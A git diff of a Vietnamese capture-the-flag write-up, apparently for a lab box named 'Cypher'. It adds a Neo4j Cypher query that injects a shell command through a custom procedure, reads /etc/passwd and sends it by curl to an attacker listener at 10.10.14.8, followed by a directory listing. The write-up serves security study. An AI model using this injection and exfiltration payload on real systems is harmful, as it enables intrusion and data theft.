@@ -144,16 +144,36 @@ Chứng minh được có cmdi:
 
 <img width="848" height="527" alt="image" src="https://github.com/user-attachments/assets/f333a40f-75d3-439a-8067-87811956714d" />
 
-Tôi lấy đoạn script python để bắt các request post `server.py`
+Tôi lấy đoạn script python để bắt các request post [server.py](https://github.com/namdt5125/road_to_hecker/blob/main/Cypher/server.py)
 
-Tôi mở file `/etc/passwd`
+Tôi mở file `/etc/passwd` bằng payload:
 
 ```
-MATCH (n:DNS_NAME) WHERE n.scope_distance = 0 CALL custom.getUrlStatusCode("http://test.com; curl http://10.10.14.8:8888/submit?data=$(cat /etc/passwd)") YIELD statusCode RETURN n.data, statusCode
+MATCH (n:DNS_NAME) WHERE n.scope_distance = 0 CALL custom.getUrlStatusCode("http://test.com; curl http://10.10.14.8:8888/submit?data=$(curl http://10.10.14.8:8888/submit -X POST -d \"data=$(cat /etc/passwd)\")") YIELD statusCode RETURN n.data, statusCode
 ```
 
+Tôi biết được vị trí của `neo4j` là `/var/lib/neo4j` 
 
+<img width="919" height="940" alt="image" src="https://github.com/user-attachments/assets/8a29ef18-aaf3-4a06-9dc0-b7d9a45416c8" />
 
+Tôi `ls -la` thì ra như sau:
+```
+total 52
+drwxr-xr-x 11 neo4j adm   4096 Feb 17  2025 .
+drwxr-xr-x 50 root  root  4096 Feb 17  2025 ..
+-rw-r--r--  1 neo4j neo4j   63 Oct  8  2024 .bash_history
+drwxrwxr-x  3 neo4j adm   4096 Oct  8  2024 .cache
+drwxr-xr-x  2 neo4j adm   4096 Aug 16  2024 certificates
+drwxr-xr-x  6 neo4j adm   4096 Oct  8  2024 data
+drwxr-xr-x  2 neo4j adm   4096 Aug 16  2024 import
+drwxr-xr-x  2 neo4j adm   4096 Feb 17  2025 labs
+drwxr-xr-x  2 neo4j adm   4096 Aug 16  2024 licenses
+-rw-r--r--  1 neo4j adm     52 Oct  2  2024 packaging_info
+drwxr-xr-x  2 neo4j adm   4096 Feb 17  2025 plugins
+drwxr-xr-x  2 neo4j adm   4096 Feb 17  2025 products
+drwxr-xr-x  2 neo4j adm   4096 Sep 17 06:24 run
+lrwxrwxrwx  1 neo4j adm      9 Oct  8  2024 .viminfo -> /dev/null
+```
 
 
 
